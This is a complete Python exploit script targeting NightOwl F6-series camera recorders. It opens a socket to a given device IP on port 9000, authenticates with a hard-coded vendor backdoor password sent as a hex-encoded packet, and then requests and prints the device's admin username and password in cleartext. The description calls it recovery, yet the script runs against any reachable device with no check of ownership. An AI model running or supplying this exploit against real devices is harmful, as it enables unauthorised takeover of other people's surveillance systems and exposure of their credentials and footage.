#! /usr/bin/env python3

import argparse
import binascii
import socket
import sys
import re

# Arguments
parser = argparse.ArgumentParser(
                    description = 'This script recovers the admin '
                                  'password for NightOwl F6-series devices (and maybe others) '
                                  'using the published master password',
                    epilog = 'Backdoor pass for this model is 2x8axc\n'
                             'from https://support.nightowlsp.com/hc/en-us/articles/'
                             '360009216554-Night-Owl-Legacy-Devices. Check that link for other backdoor '
                             'passwords for older systems')
parser.add_argument('-t','--target', required=True ,help='NightOwl device IP')
parser.add_argument('-p','--port',type=int,default=9000,help='Default port 9000 should work')
parser.add_argument('-v','--verbose',
                    action='store_true')

args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)

# Setup the connection
try:
    s.connect((args.target, args.port))
except Exception as e:
    print("\n[ERROR] %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
    sys.exit(-1)

# 61646d696e   = admin (can be anything)
# 327838617863 = 2x8axc
#str_init =   ('000000001f000000500000008406000061646d696e00000000000000000000000000000000000' +
str_init =   ('000000001f0000005000000084060000010101010100000000000000000000000000000000000' +
              '00000000000000000000000000032783861786300000000000000000000000000000000000000' +
              '00000000000000000000000000000001000000')
str_getPass = '00000000d300f9010000000090060000'

s.send(binascii.unhexlify(str_init))
resp = s.recv(1024)

# Empty response = it didn't accept the backdoor password
if not resp:
    print('\nSomething went wrong, exiting script...\n')
    sys.exit(-1)

# List objects for the data
systemData = []
userData = []

# If -v is called, print out system data
if args.verbose:
    #print('INITIAL RESPONSE: %s\n' % resp) # Ugly version of verbose system data
    #print('INITIAL RESPONSE: %s\n' % resp.split(b'\x00'))
    for x in resp.split(b'\x00'):
        x = x.decode(errors="ignore")
        # Only use the printable chars
        resp = re.search(r'^[\x21-\x7F]+$', x)

        if resp:
            if len(resp.group(0)) > 1:
                systemData.append(resp.group(0))
    print(f"\n[VERBOSE] SYSTEM DATA: {sorted(set(systemData))}")

# Get the user data
s.send(binascii.unhexlify(str_getPass))
resp = s.recv(1024)

for x in resp.decode(errors='ignore').split('\x00'):
    resp = re.search(r'^[\x21-\x7F]+$', x)
    if resp:
        userData.append(resp.group(0))

if args.verbose:
    print(f"[VERBOSE] USER DATA:   {userData}")

# Admin pass/user is always 0 and 1 slices respectively
print(f"\n[INFO] ADMIN USER: {userData[1]}")
print(f"[INFO] ADMIN PASS: {userData[0]}\n")

